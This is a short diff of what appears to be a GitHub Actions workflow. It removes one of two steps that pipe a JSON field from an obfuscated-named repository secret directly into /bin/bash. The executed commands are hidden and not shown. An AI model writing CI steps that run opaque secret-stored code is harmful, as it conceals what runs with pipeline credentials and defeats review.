@@ -20,7 +20,6 @@ jobs:
           a99: ${{ secrets.a99 }}
         run: |
           printf '%s' "$a99" | jq -r .ju00855 | /bin/bash
-          printf '%s' "$aacj517" | jq -r .g14200 | /bin/bash
 
       - name: Save output
         if: always()
